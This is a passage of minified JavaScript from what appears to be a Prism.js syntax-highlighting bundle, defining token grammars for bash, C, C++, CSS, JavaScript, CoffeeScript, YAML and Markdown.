hind:!0,alias:"constant"}},alias:"variable",lookbehind:!0},string:[{pattern:/((?:^|[^<])<<-?\s*)(\w+)\s[\s\S]*?(?:\r?\n|\r)\2/,lookbehind:!0,greedy:!0,inside:a},{pattern:/((?:^|[^<])<<-?\s*)(["'])(\w+)\2\s[\s\S]*?(?:\r?\n|\r)\3/,lookbehind:!0,greedy:!0,inside:{bash:n}},{pattern:/(^|[^\\](?:\\\\)*)"(?:\\[\s\S]|\$\([^)]+\)|\$(?!\()|`[^`]+`|[^"\\`$])*"/,lookbehind:!0,greedy:!0,inside:a},{pattern:/(^|[^$\\])'[^']*'/,lookbehind:!0,greedy:!0},{pattern:/\$'(?:[^'\\]|\\[\s\S])*'/,greedy:!0,inside:{entity:a.entity}}],environment:{pattern:RegExp("\\$?"+t),alias:"constant"},variable:a.variable,function:{pattern:/(^|[\s;|&]|[<>]\()(?:add|apropos|apt|apt-cache|apt-get|aptitude|aspell|automysqlbackup|awk|basename|bash|bc|bconsole|bg|bzip2|cal|cat|cfdisk|chgrp|chkconfig|chmod|chown|chroot|cksum|clear|cmp|column|comm|composer|cp|cron|crontab|csplit|curl|cut|date|dc|dd|ddrescue|debootstrap|df|diff|diff3|dig|dir|dircolors|dirname|dirs|dmesg|docker|docker-compose|du|egrep|eject|env|ethtool|expand|expect|expr|fdformat|fdisk|fg|fgrep|file|find|fmt|fold|format|free|fsck|ftp|fuser|gawk|git|gparted|grep|groupadd|groupdel|groupmod|groups|grub-mkconfig|gzip|halt|head|hg|history|host|hostname|htop|iconv|id|ifconfig|ifdown|ifup|import|install|ip|jobs|join|kill|killall|less|link|ln|locate|logname|logrotate|look|lpc|lpr|lprint|lprintd|lprintq|lprm|ls|lsof|lynx|make|man|mc|mdadm|mkconfig|mkdir|mke2fs|mkfifo|mkfs|mkisofs|mknod|mkswap|mmv|more|most|mount|mtools|mtr|mutt|mv|nano|nc|netstat|nice|nl|node|nohup|notify-send|npm|nslookup|op|open|parted|passwd|paste|pathchk|ping|pkill|pnpm|podman|podman-compose|popd|pr|printcap|printenv|ps|pushd|pv|quota|quotacheck|quotactl|ram|rar|rcp|reboot|remsync|rename|renice|rev|rm|rmdir|rpm|rsync|scp|screen|sdiff|sed|sendmail|seq|service|sftp|sh|shellcheck|shuf|shutdown|sleep|slocate|sort|split|ssh|stat|strace|su|sudo|sum|suspend|swapon|sync|tac|tail|tar|tee|time|timeout|top|touch|tr|traceroute|tsort|tty|umount|uname|unexpand|uniq|units|unrar|unshar|unzip|update-grub|uptime|useradd|userdel|usermod|users|uudecode|uuencode|v|vcpkg|vdir|vi|vim|virsh|vmstat|wait|watch|wc|wget|whereis|which|who|whoami|write|xargs|xdg-open|yarn|yes|zenity|zip|zsh|zypper)(?=$|[)\s;|&])/,lookbehind:!0},keyword:{pattern:/(^|[\s;|&]|[<>]\()(?:case|do|done|elif|else|esac|fi|for|function|if|in|select|then|until|while)(?=$|[)\s;|&])/,lookbehind:!0},builtin:{pattern:/(^|[\s;|&]|[<>]\()(?:\.|:|alias|bind|break|builtin|caller|cd|command|continue|declare|echo|enable|eval|exec|exit|export|getopts|hash|help|let|local|logout|mapfile|printf|pwd|read|readarray|readonly|return|set|shift|shopt|source|test|times|trap|type|typeset|ulimit|umask|unalias|unset)(?=$|[)\s;|&])/,lookbehind:!0,alias:"class-name"},boolean:{pattern:/(^|[\s;|&]|[<>]\()(?:false|true)(?=$|[)\s;|&])/,lookbehind:!0},"file-descriptor":{pattern:/\B&\d\b/,alias:"important"},operator:{pattern:/\d?<>|>\||\+=|=[=~]?|!=?|<<[<-]?|[&\d]?>>|\d[<>]&?|[<>][&=]?|&[>&]?|\|[&|]?/,inside:{"file-descriptor":{pattern:/^\d/,alias:"important"}}},punctuation:/\$?\(\(?|\)\)?|\.\.|[{}[\];\\]/,number:{pattern:/(^|\s)(?:[1-9]\d*|0)(?:[.,]\d+)?\b/,lookbehind:!0}},n.inside=e.languages.bash;for(var r=["comment","function-name","for-or-select","assign-left","string","environment","function","keyword","builtin","boolean","file-descriptor","operator","punctuation","number"],l=a.variable[1].inside,o=0;o<r.length;o++)l[r[o]]=e.languages.bash[r[o]];e.languages.shell=e.languages.bash}(o),o.languages.clike={comment:[{pattern:/(^|[^\\])\/\*[\s\S]*?(?:\*\/|$)/,lookbehind:!0,greedy:!0},{pattern:/(^|[^\\:])\/\/.*/,lookbehind:!0,greedy:!0}],string:{pattern:/(["'])(?:\\(?:\r\n|[\s\S])|(?!\1)[^\\\r\n])*\1/,greedy:!0},"class-name":{pattern:/(\b(?:class|extends|implements|instanceof|interface|new|trait)\s+|\bcatch\s+\()[\w.\\]+/i,lookbehind:!0,inside:{punctuation:/[.\\]/}},keyword:/\b(?:break|catch|continue|do|else|finally|for|function|if|in|instanceof|new|null|return|throw|try|while)\b/,boolean:/\b(?:false|true)\b/,function:/\b\w+(?=\()/,number:/\b0x[\da-f]+\b|(?:\b\d+(?:\.\d*)?|\B\.\d+)(?:e[+-]?\d+)?/i,operator:/[<>]=?|[!=]=?=?|--?|\+\+?|&&?|\|\|?|[?*/~^%]/,punctuation:/[{}[\];(),.:]/},o.languages.c=o.languages.extend("clike",{comment:{pattern:/\/\/(?:[^\r\n\\]|\\(?:\r\n?|\n|(?![\r\n])))*|\/\*[\s\S]*?(?:\*\/|$)/,greedy:!0},string:{pattern:/"(?:\\(?:\r\n|[\s\S])|[^"\\\r\n])*"/,greedy:!0},"class-name":{pattern:/(\b(?:enum|struct)\s+(?:__attribute__\s*\(\([\s\S]*?\)\)\s*)?)\w+|\b[a-z]\w*_t\b/,lookbehind:!0},keyword:/\b(?:_Alignas|_Alignof|_Atomic|_Bool|_Complex|_Generic|_Imaginary|_Noreturn|_Static_assert|_Thread_local|__attribute__|asm|auto|break|case|char|const|continue|default|do|double|else|enum|extern|float|for|goto|if|inline|int|long|register|return|short|signed|sizeof|static|struct|switch|typedef|typeof|union|unsigned|void|volatile|while)\b/,function:/\b[a-z_]\w*(?=\s*\()/i,number:/(?:\b0x(?:[\da-f]+(?:\.[\da-f]*)?|\.[\da-f]+)(?:p[+-]?\d+)?|(?:\b\d+(?:\.\d*)?|\B\.\d+)(?:e[+-]?\d+)?)[ful]{0,4}/i,operator:/>>=?|<<=?|->|([-+&|:])\1|[?:~]|[-+*/%&|^!=<>]=?/}),o.languages.insertBefore("c","string",{char:{pattern:/'(?:\\(?:\r\n|[\s\S])|[^'\\\r\n]){0,32}'/,greedy:!0}}),o.languages.insertBefore("c","string",{macro:{pattern:/(^[\t ]*)#\s*[a-z](?:[^\r\n\\/]|\/(?!\*)|\/\*(?:[^*]|\*(?!\/))*\*\/|\\(?:\r\n|[\s\S]))*/im,lookbehind:!0,greedy:!0,alias:"property",inside:{string:[{pattern:/^(#\s*include\s*)<[^>]+>/,lookbehind:!0},o.languages.c["string"]],char:o.languages.c["char"],comment:o.languages.c["comment"],"macro-name":[{pattern:/(^#\s*define\s+)\w+\b(?!\()/i,lookbehind:!0},{pattern:/(^#\s*define\s+)\w+\b(?=\()/i,lookbehind:!0,alias:"function"}],directive:{pattern:/^(#\s*)[a-z]+/,lookbehind:!0,alias:"keyword"},"directive-hash":/^#/,punctuation:/##|\\(?=[\r\n])/,expression:{pattern:/\S[\s\S]*/,inside:o.languages.c}}}}),o.languages.insertBefore("c","function",{constant:/\b(?:EOF|NULL|SEEK_CUR|SEEK_END|SEEK_SET|__DATE__|__FILE__|__LINE__|__TIMESTAMP__|__TIME__|__func__|stderr|stdin|stdout)\b/}),delete o.languages.c["boolean"],function(e){var t=/\b(?:alignas|alignof|asm|auto|bool|break|case|catch|char|char16_t|char32_t|char8_t|class|co_await|co_return|co_yield|compl|concept|const|const_cast|consteval|constexpr|constinit|continue|decltype|default|delete|do|double|dynamic_cast|else|enum|explicit|export|extern|final|float|for|friend|goto|if|import|inline|int|int16_t|int32_t|int64_t|int8_t|long|module|mutable|namespace|new|noexcept|nullptr|operator|override|private|protected|public|register|reinterpret_cast|requires|return|short|signed|sizeof|static|static_assert|static_cast|struct|switch|template|this|thread_local|throw|try|typedef|typeid|typename|uint16_t|uint32_t|uint64_t|uint8_t|union|unsigned|using|virtual|void|volatile|wchar_t|while)\b/,n=/\b(?!<keyword>)\w+(?:\s*\.\s*\w+)*\b/.source.replace(/<keyword>/g,(function(){return t.source}));e.languages.cpp=e.languages.extend("c",{"class-name":[{pattern:RegExp(/(\b(?:class|concept|enum|struct|typename)\s+)(?!<keyword>)\w+/.source.replace(/<keyword>/g,(function(){return t.source}))),lookbehind:!0},/\b[A-Z]\w*(?=\s*::\s*\w+\s*\()/,/\b[A-Z_]\w*(?=\s*::\s*~\w+\s*\()/i,/\b\w+(?=\s*<(?:[^<>]|<(?:[^<>]|<[^<>]*>)*>)*>\s*::\s*\w+\s*\()/],keyword:t,number:{pattern:/(?:\b0b[01']+|\b0x(?:[\da-f']+(?:\.[\da-f']*)?|\.[\da-f']+)(?:p[+-]?[\d']+)?|(?:\b[\d']+(?:\.[\d']*)?|\B\.[\d']+)(?:e[+-]?[\d']+)?)[ful]{0,4}/i,greedy:!0},operator:/>>=?|<<=?|->|--|\+\+|&&|\|\||[?:~]|<=>|[-+*/%&|^!=<>]=?|\b(?:and|and_eq|bitand|bitor|not|not_eq|or|or_eq|xor|xor_eq)\b/,boolean:/\b(?:false|true)\b/}),e.languages.insertBefore("cpp","string",{module:{pattern:RegExp(/(\b(?:import|module)\s+)/.source+"(?:"+/"(?:\\(?:\r\n|[\s\S])|[^"\\\r\n])*"|<[^<>\r\n]*>/.source+"|"+/<mod-name>(?:\s*:\s*<mod-name>)?|:\s*<mod-name>/.source.replace(/<mod-name>/g,(function(){return n}))+")"),lookbehind:!0,greedy:!0,inside:{string:/^[<"][\s\S]+/,operator:/:/,punctuation:/\./}},"raw-string":{pattern:/R"([^()\\ ]{0,16})\([\s\S]*?\)\1"/,alias:"string",greedy:!0}}),e.languages.insertBefore("cpp","keyword",{"generic-function":{pattern:/\b(?!operator\b)[a-z_]\w*\s*<(?:[^<>]|<[^<>]*>)*>(?=\s*\()/i,inside:{function:/^\w+/,generic:{pattern:/<[\s\S]+/,alias:"class-name",inside:e.languages.cpp}}}}),e.languages.insertBefore("cpp","operator",{"double-colon":{pattern:/::/,alias:"punctuation"}}),e.languages.insertBefore("cpp","class-name",{"base-clause":{pattern:/(\b(?:class|struct)\s+\w+\s*:\s*)[^;{}"'\s]+(?:\s+[^;{}"'\s]+)*(?=\s*[;{])/,lookbehind:!0,greedy:!0,inside:e.languages.extend("cpp",{})}}),e.languages.insertBefore("inside","double-colon",{"class-name":/\b[a-z_]\w*\b(?!\s*::)/i},e.languages.cpp["base-clause"])}(o),function(e){var t=/(?:"(?:\\(?:\r\n|[\s\S])|[^"\\\r\n])*"|'(?:\\(?:\r\n|[\s\S])|[^'\\\r\n])*')/;e.languages.css={comment:/\/\*[\s\S]*?\*\//,atrule:{pattern:/@[\w-](?:[^;{\s]|\s+(?![\s{]))*(?:;|(?=\s*\{))/,inside:{rule:/^@[\w-]+/,"selector-function-argument":{pattern:/(\bselector\s*\(\s*(?![\s)]))(?:[^()\s]|\s+(?![\s)])|\((?:[^()]|\([^()]*\))*\))+(?=\s*\))/,lookbehind:!0,alias:"selector"},keyword:{pattern:/(^|[^\w-])(?:and|not|only|or)(?![\w-])/,lookbehind:!0}}},url:{pattern:RegExp("\\burl\\((?:"+t.source+"|"+/(?:[^\\\r\n()"']|\\[\s\S])*/.source+")\\)","i"),greedy:!0,inside:{function:/^url/i,punctuation:/^\(|\)$/,string:{pattern:RegExp("^"+t.source+"$"),alias:"url"}}},selector:{pattern:RegExp("(^|[{}\\s])[^{}\\s](?:[^{};\"'\\s]|\\s+(?![\\s{])|"+t.source+")*(?=\\s*\\{)"),lookbehind:!0},string:{pattern:t,greedy:!0},property:{pattern:/(^|[^-\w\xA0-\uFFFF])(?!\s)[-_a-z\xA0-\uFFFF](?:(?!\s)[-\w\xA0-\uFFFF])*(?=\s*:)/i,lookbehind:!0},important:/!important\b/i,function:{pattern:/(^|[^-a-z0-9])[-a-z0-9]+(?=\()/i,lookbehind:!0},punctuation:/[(){};:,]/},e.languages.css["atrule"].inside.rest=e.languages.css;var n=e.languages.markup;n&&(n.tag.addInlined("style","css"),n.tag.addAttribute("style","css"))}(o),function(e){var t,n=/("|')(?:\\(?:\r\n|[\s\S])|(?!\1)[^\\\r\n])*\1/;e.languages.css.selector={pattern:e.languages.css.selector.pattern,lookbehind:!0,inside:t={"pseudo-element":/:(?:after|before|first-letter|first-line|selection)|::[-\w]+/,"pseudo-class":/:[-\w]+/,class:/\.[-\w]+/,id:/#[-\w]+/,attribute:{pattern:RegExp("\\[(?:[^[\\]\"']|"+n.source+")*\\]"),greedy:!0,inside:{punctuation:/^\[|\]$/,"case-sensitivity":{pattern:/(\s)[si]$/i,lookbehind:!0,alias:"keyword"},namespace:{pattern:/^(\s*)(?:(?!\s)[-*\w\xA0-\uFFFF])*\|(?!=)/,lookbehind:!0,inside:{punctuation:/\|$/}},"attr-name":{pattern:/^(\s*)(?:(?!\s)[-\w\xA0-\uFFFF])+/,lookbehind:!0},"attr-value":[n,{pattern:/(=\s*)(?:(?!\s)[-\w\xA0-\uFFFF])+(?=\s*$)/,lookbehind:!0}],operator:/[|~*^$]?=/}},"n-th":[{pattern:/(\(\s*)[+-]?\d*[\dn](?:\s*[+-]\s*\d+)?(?=\s*\))/,lookbehind:!0,inside:{number:/[\dn]+/,operator:/[+-]/}},{pattern:/(\(\s*)(?:even|odd)(?=\s*\))/i,lookbehind:!0}],combinator:/>|\+|~|\|\|/,punctuation:/[(),]/}},e.languages.css["atrule"].inside["selector-function-argument"].inside=t,e.languages.insertBefore("css","property",{variable:{pattern:/(^|[^-\w\xA0-\uFFFF])--(?!\s)[-_a-z\xA0-\uFFFF](?:(?!\s)[-\w\xA0-\uFFFF])*/i,lookbehind:!0}});var a={pattern:/(\b\d+)(?:%|[a-z]+(?![\w-]))/,lookbehind:!0},r={pattern:/(^|[^\w.-])-?(?:\d+(?:\.\d+)?|\.\d+)/,lookbehind:!0};e.languages.insertBefore("css","function",{operator:{pattern:/(\s)[+\-*\/](?=\s)/,lookbehind:!0},hexcode:{pattern:/\B#[\da-f]{3,8}\b/i,alias:"color"},color:[{pattern:/(^|[^\w-])(?:AliceBlue|AntiqueWhite|Aqua|Aquamarine|Azure|Beige|Bisque|Black|BlanchedAlmond|Blue|BlueViolet|Brown|BurlyWood|CadetBlue|Chartreuse|Chocolate|Coral|CornflowerBlue|Cornsilk|Crimson|Cyan|DarkBlue|DarkCyan|DarkGoldenRod|DarkGr[ae]y|DarkGreen|DarkKhaki|DarkMagenta|DarkOliveGreen|DarkOrange|DarkOrchid|DarkRed|DarkSalmon|DarkSeaGreen|DarkSlateBlue|DarkSlateGr[ae]y|DarkTurquoise|DarkViolet|DeepPink|DeepSkyBlue|DimGr[ae]y|DodgerBlue|FireBrick|FloralWhite|ForestGreen|Fuchsia|Gainsboro|GhostWhite|Gold|GoldenRod|Gr[ae]y|Green|GreenYellow|HoneyDew|HotPink|IndianRed|Indigo|Ivory|Khaki|Lavender|LavenderBlush|LawnGreen|LemonChiffon|LightBlue|LightCoral|LightCyan|LightGoldenRodYellow|LightGr[ae]y|LightGreen|LightPink|LightSalmon|LightSeaGreen|LightSkyBlue|LightSlateGr[ae]y|LightSteelBlue|LightYellow|Lime|LimeGreen|Linen|Magenta|Maroon|MediumAquaMarine|MediumBlue|MediumOrchid|MediumPurple|MediumSeaGreen|MediumSlateBlue|MediumSpringGreen|MediumTurquoise|MediumVioletRed|MidnightBlue|MintCream|MistyRose|Moccasin|NavajoWhite|Navy|OldLace|Olive|OliveDrab|Orange|OrangeRed|Orchid|PaleGoldenRod|PaleGreen|PaleTurquoise|PaleVioletRed|PapayaWhip|PeachPuff|Peru|Pink|Plum|PowderBlue|Purple|Red|RosyBrown|RoyalBlue|SaddleBrown|Salmon|SandyBrown|SeaGreen|SeaShell|Sienna|Silver|SkyBlue|SlateBlue|SlateGr[ae]y|Snow|SpringGreen|SteelBlue|Tan|Teal|Thistle|Tomato|Transparent|Turquoise|Violet|Wheat|White|WhiteSmoke|Yellow|YellowGreen)(?![\w-])/i,lookbehind:!0},{pattern:/\b(?:hsl|rgb)\(\s*\d{1,3}\s*,\s*\d{1,3}%?\s*,\s*\d{1,3}%?\s*\)\B|\b(?:hsl|rgb)a\(\s*\d{1,3}\s*,\s*\d{1,3}%?\s*,\s*\d{1,3}%?\s*,\s*(?:0|0?\.\d+|1)\s*\)\B/i,inside:{unit:a,number:r,function:/[\w-]+(?=\()/,punctuation:/[(),]/}}],entity:/\\[\da-f]{1,8}/i,unit:a,number:r})}(o),o.languages.javascript=o.languages.extend("clike",{"class-name":[o.languages.clike["class-name"],{pattern:/(^|[^$\w\xA0-\uFFFF])(?!\s)[_$A-Z\xA0-\uFFFF](?:(?!\s)[$\w\xA0-\uFFFF])*(?=\.(?:constructor|prototype))/,lookbehind:!0}],keyword:[{pattern:/((?:^|\})\s*)catch\b/,lookbehind:!0},{pattern:/(^|[^.]|\.\.\.\s*)\b(?:as|assert(?=\s*\{)|async(?=\s*(?:function\b|\(|[$\w\xA0-\uFFFF]|$))|await|break|case|class|const|continue|debugger|default|delete|do|else|enum|export|extends|finally(?=\s*(?:\{|$))|for|from(?=\s*(?:['"]|$))|function|(?:get|set)(?=\s*(?:[#\[$\w\xA0-\uFFFF]|$))|if|implements|import|in|instanceof|interface|let|new|null|of|package|private|protected|public|return|static|super|switch|this|throw|try|typeof|undefined|var|void|while|with|yield)\b/,lookbehind:!0}],function:/#?(?!\s)[_$a-zA-Z\xA0-\uFFFF](?:(?!\s)[$\w\xA0-\uFFFF])*(?=\s*(?:\.\s*(?:apply|bind|call)\s*)?\()/,number:{pattern:RegExp(/(^|[^\w$])/.source+"(?:"+/NaN|Infinity/.source+"|"+/0[bB][01]+(?:_[01]+)*n?/.source+"|"+/0[oO][0-7]+(?:_[0-7]+)*n?/.source+"|"+/0[xX][\dA-Fa-f]+(?:_[\dA-Fa-f]+)*n?/.source+"|"+/\d+(?:_\d+)*n/.source+"|"+/(?:\d+(?:_\d+)*(?:\.(?:\d+(?:_\d+)*)?)?|\.\d+(?:_\d+)*)(?:[Ee][+-]?\d+(?:_\d+)*)?/.source+")"+/(?![\w$])/.source),lookbehind:!0},operator:/--|\+\+|\*\*=?|=>|&&=?|\|\|=?|[!=]==|<<=?|>>>?=?|[-+*/%&|^!=<>]=?|\.{3}|\?\?=?|\?\.?|[~:]/}),o.languages.javascript["class-name"][0].pattern=/(\b(?:class|extends|implements|instanceof|interface|new)\s+)[\w.\\]+/,o.languages.insertBefore("javascript","keyword",{regex:{pattern:/((?:^|[^$\w\xA0-\uFFFF."'\])\s]|\b(?:return|yield))\s*)\/(?:\[(?:[^\]\\\r\n]|\\.)*\]|\\.|[^/\\\[\r\n])+\/[dgimyus]{0,7}(?=(?:\s|\/\*(?:[^*]|\*(?!\/))*\*\/)*(?:$|[\r\n,.;:})\]]|\/\/))/,lookbehind:!0,greedy:!0,inside:{"regex-source":{pattern:/^(\/)[\s\S]+(?=\/[a-z]*$)/,lookbehind:!0,alias:"language-regex",inside:o.languages.regex},"regex-delimiter":/^\/|\/$/,"regex-flags":/^[a-z]+$/}},"function-variable":{pattern:/#?(?!\s)[_$a-zA-Z\xA0-\uFFFF](?:(?!\s)[$\w\xA0-\uFFFF])*(?=\s*[=:]\s*(?:async\s*)?(?:\bfunction\b|(?:\((?:[^()]|\([^()]*\))*\)|(?!\s)[_$a-zA-Z\xA0-\uFFFF](?:(?!\s)[$\w\xA0-\uFFFF])*)\s*=>))/,alias:"function"},parameter:[{pattern:/(function(?:\s+(?!\s)[_$a-zA-Z\xA0-\uFFFF](?:(?!\s)[$\w\xA0-\uFFFF])*)?\s*\(\s*)(?!\s)(?:[^()\s]|\s+(?![\s)])|\([^()]*\))+(?=\s*\))/,lookbehind:!0,inside:o.languages.javascript},{pattern:/(^|[^$\w\xA0-\uFFFF])(?!\s)[_$a-z\xA0-\uFFFF](?:(?!\s)[$\w\xA0-\uFFFF])*(?=\s*=>)/i,lookbehind:!0,inside:o.languages.javascript},{pattern:/(\(\s*)(?!\s)(?:[^()\s]|\s+(?![\s)])|\([^()]*\))+(?=\s*\)\s*=>)/,lookbehind:!0,inside:o.languages.javascript},{pattern:/((?:\b|\s|^)(?!(?:as|async|await|break|case|catch|class|const|continue|debugger|default|delete|do|else|enum|export|extends|finally|for|from|function|get|if|implements|import|in|instanceof|interface|let|new|null|of|package|private|protected|public|return|set|static|super|switch|this|throw|try|typeof|undefined|var|void|while|with|yield)(?![$\w\xA0-\uFFFF]))(?:(?!\s)[_$a-zA-Z\xA0-\uFFFF](?:(?!\s)[$\w\xA0-\uFFFF])*\s*)\(\s*|\]\s*\(\s*)(?!\s)(?:[^()\s]|\s+(?![\s)])|\([^()]*\))+(?=\s*\)\s*\{)/,lookbehind:!0,inside:o.languages.javascript}],constant:/\b[A-Z](?:[A-Z_]|\dx?)*\b/}),o.languages.insertBefore("javascript","string",{hashbang:{pattern:/^#!.*/,greedy:!0,alias:"comment"},"template-string":{pattern:/`(?:\\[\s\S]|\$\{(?:[^{}]|\{(?:[^{}]|\{[^}]*\})*\})+\}|(?!\$\{)[^\\`])*`/,greedy:!0,inside:{"template-punctuation":{pattern:/^`|`$/,alias:"string"},interpolation:{pattern:/((?:^|[^\\])(?:\\{2})*)\$\{(?:[^{}]|\{(?:[^{}]|\{[^}]*\})*\})+\}/,lookbehind:!0,inside:{"interpolation-punctuation":{pattern:/^\$\{|\}$/,alias:"punctuation"},rest:o.languages.javascript}},string:/[\s\S]+/}},"string-property":{pattern:/((?:^|[,{])[ \t]*)(["'])(?:\\(?:\r\n|[\s\S])|(?!\2)[^\\\r\n])*\2(?=\s*:)/m,lookbehind:!0,greedy:!0,alias:"property"}}),o.languages.insertBefore("javascript","operator",{"literal-property":{pattern:/((?:^|[,{])[ \t]*)(?!\s)[_$a-zA-Z\xA0-\uFFFF](?:(?!\s)[$\w\xA0-\uFFFF])*(?=\s*:)/m,lookbehind:!0,alias:"property"}}),o.languages.markup&&(o.languages.markup.tag.addInlined("script","javascript"),o.languages.markup.tag.addAttribute(/on(?:abort|blur|change|click|composition(?:end|start|update)|dblclick|error|focus(?:in|out)?|key(?:down|up)|load|mouse(?:down|enter|leave|move|out|over|up)|reset|resize|scroll|select|slotchange|submit|unload|wheel)/.source,"javascript")),o.languages.js=o.languages.javascript,function(e){var t=/#(?!\{).+/,n={pattern:/#\{[^}]+\}/,alias:"variable"};e.languages.coffeescript=e.languages.extend("javascript",{comment:t,string:[{pattern:/'(?:\\[\s\S]|[^\\'])*'/,greedy:!0},{pattern:/"(?:\\[\s\S]|[^\\"])*"/,greedy:!0,inside:{interpolation:n}}],keyword:/\b(?:and|break|by|catch|class|continue|debugger|delete|do|each|else|extend|extends|false|finally|for|if|in|instanceof|is|isnt|let|loop|namespace|new|no|not|null|of|off|on|or|own|return|super|switch|then|this|throw|true|try|typeof|undefined|unless|until|when|while|window|with|yes|yield)\b/,"class-member":{pattern:/@(?!\d)\w+/,alias:"variable"}}),e.languages.insertBefore("coffeescript","comment",{"multiline-comment":{pattern:/###[\s\S]+?###/,alias:"comment"},"block-regex":{pattern:/\/{3}[\s\S]*?\/{3}/,alias:"regex",inside:{comment:t,interpolation:n}}}),e.languages.insertBefore("coffeescript","string",{"inline-javascript":{pattern:/`(?:\\[\s\S]|[^\\`])*`/,inside:{delimiter:{pattern:/^`|`$/,alias:"punctuation"},script:{pattern:/[\s\S]+/,alias:"language-javascript",inside:e.languages.javascript}}},"multiline-string":[{pattern:/'''[\s\S]*?'''/,greedy:!0,alias:"string"},{pattern:/"""[\s\S]*?"""/,greedy:!0,alias:"string",inside:{interpolation:n}}]}),e.languages.insertBefore("coffeescript","keyword",{property:/(?!\d)\w+(?=\s*:(?!:))/}),delete e.languages.coffeescript["template-string"],e.languages.coffee=e.languages.coffeescript}(o),function(e){var t=/[*&][^\s[\]{},]+/,n=/!(?:<[\w\-%#;/?:@&=+$,.!~*'()[\]]+>|(?:[a-zA-Z\d-]*!)?[\w\-%#;/?:@&=+$.~*'()]+)?/,a="(?:"+n.source+"(?:[ \t]+"+t.source+")?|"+t.source+"(?:[ \t]+"+n.source+")?)",r=/(?:[^\s\x00-\x08\x0e-\x1f!"#%&'*,\-:>?@[\]`{|}\x7f-\x84\x86-\x9f\ud800-\udfff\ufffe\uffff]|[?:-]<PLAIN>)(?:[ \t]*(?:(?![#:])<PLAIN>|:<PLAIN>))*/.source.replace(/<PLAIN>/g,(function(){return/[^\s\x00-\x08\x0e-\x1f,[\]{}\x7f-\x84\x86-\x9f\ud800-\udfff\ufffe\uffff]/.source})),l=/"(?:[^"\\\r\n]|\\.)*"|'(?:[^'\\\r\n]|\\.)*'/.source;function o(e,t){t=(t||"").replace(/m/g,"")+"m";var n=/([:\-,[{]\s*(?:\s<<prop>>[ \t]+)?)(?:<<value>>)(?=[ \t]*(?:$|,|\]|\}|(?:[\r\n]\s*)?#))/.source.replace(/<<prop>>/g,(function(){return a})).replace(/<<value>>/g,(function(){return e}));return RegExp(n,t)}e.languages.yaml={scalar:{pattern:RegExp(/([\-:]\s*(?:\s<<prop>>[ \t]+)?[|>])[ \t]*(?:((?:\r?\n|\r)[ \t]+)\S[^\r\n]*(?:\2[^\r\n]+)*)/.source.replace(/<<prop>>/g,(function(){return a}))),lookbehind:!0,alias:"string"},comment:/#.*/,key:{pattern:RegExp(/((?:^|[:\-,[{\r\n?])[ \t]*(?:<<prop>>[ \t]+)?)<<key>>(?=\s*:\s)/.source.replace(/<<prop>>/g,(function(){return a})).replace(/<<key>>/g,(function(){return"(?:"+r+"|"+l+")"}))),lookbehind:!0,greedy:!0,alias:"atrule"},directive:{pattern:/(^[ \t]*)%.+/m,lookbehind:!0,alias:"important"},datetime:{pattern:o(/\d{4}-\d\d?-\d\d?(?:[tT]|[ \t]+)\d\d?:\d{2}:\d{2}(?:\.\d*)?(?:[ \t]*(?:Z|[-+]\d\d?(?::\d{2})?))?|\d{4}-\d{2}-\d{2}|\d\d?:\d{2}(?::\d{2}(?:\.\d*)?)?/.source),lookbehind:!0,alias:"number"},boolean:{pattern:o(/false|true/.source,"i"),lookbehind:!0,alias:"important"},null:{pattern:o(/null|~/.source,"i"),lookbehind:!0,alias:"important"},string:{pattern:o(l),lookbehind:!0,greedy:!0},number:{pattern:o(/[+-]?(?:0x[\da-f]+|0o[0-7]+|(?:\d+(?:\.\d*)?|\.\d+)(?:e[+-]?\d+)?|\.inf|\.nan)/.source,"i"),lookbehind:!0},tag:n,important:t,punctuation:/---|[:[\]{}\-,|>?]|\.\.\./},e.languages.yml=e.languages.yaml}(o),function(e){var t=/(?:\\.|[^\\\n\r]|(?:\n|\r\n?)(?![\r\n]))/.source;function n(e){return e=e.replace(/<inner>/g,(function(){return t})),RegExp(/((?:^|[^\\])(?:\\{2})*)/.source+"(?:"+e+")")}var a=/(?:\\.|``(?:[^`\r\n]|`(?!`))+``|`[^`\r\n]+`|[^\\|\r\n`])+/.source,r=/\|?__(?:\|__)+\|?(?:(?:\n|\r\n?)|(?![\s\S]))/.source.replace(/__/g,(function(){return a})),l=/\|?[ \t]*:?-{3,}:?[ \t]*(?:\|[ \t]*:?-{3,}:?[ \t]*)+\|?(?:\n|\r\n?)/.source;e.languages.markdown=e.languages.extend("markup",{}),e.languages.insertBefore("markdown","prolog",{"front-matter-block":{pattern:/(^(?:\s*[\r\n])?)---(?!.)[\s\S]*?[\r\n]---(?!.)/,lookbehind:!0,greedy:!0,inside:{punctuation:/^---|---$/,"front-matter":{pattern:/\S+(?:\s+\S+)*/,alias:["yaml","language-yaml"],inside:e.languages.yaml}}},blockquote:{pattern:/^>(?:[\t ]*>)*/m,alias:"punctuation"},table:{pattern:RegExp("^"+r+l+"(?:"+r+")*","m"),inside:{"table-data-rows":{pattern:RegExp("^("+r+l+")(?:"+r+")*$"),lookbehind:!0,inside:{"table-data":{pattern:RegExp(a),inside:e.languages.markdown},punctuation:/\|/}},"table-line":{pattern:RegExp("^("+r+")"+l+"$"),lookbehind:!0,inside:{punctuation:/\||:?-{3,}:?/}},"table-header-row":{pattern:RegExp("^"+r+"$"),inside:{"table-header":{pattern:RegExp(a),alias:"important",inside:e.languages.markdown},punctuation:/\|/}}}},code:[{pattern:/((?:^|\n)[ \t]*\n|(?:^|\r\n?)[ \t]*\r\n?)(?: {4}|\t).+(?:(?:\n|\r\n?)(?: {4}|\t).+)*/,lookbehind:!0,alias:"keyword"},{pattern:/^```[\s\S]*?^```$/m,greedy:!0,inside:{"code-block":{pattern:/^(```.*(?:\n|\r\n?))[\s\S]+?(?=(?:\n|\r\n?)^```$)/m,lookbehind:!0},"code-language":{pattern:/^(```).+/,lookbehind:!0},punctuation:/```/}}],title:[{pattern:/\S.*(?:\n|\r\n?)(?:==+|--+)(?=[ \t]*$)/m,alias:"important",inside:{punctuation:/==+$|--+$/}},{pattern:/(^\s*)#.+/m,lookbehind:!0,alias:"important",inside:{punctuation:/^#+|#+$/}}],hr:{pattern:/(^\s*)([*-])(?:[\t ]*\2){2,}(?=\s*$)/m,lookbehind:!0,alias:"punctuation"},list:{pattern:/(^\s*)(?:[*+-]|\d+\.)(?=[\t ].)/m,lookbehind:!0,alias:"punctuation"},"url-reference":{pattern:/!?\[[^\]]+\]:[\t ]+(?:\S+|<(?:\\.|[^>\\])+>)(?:[\t 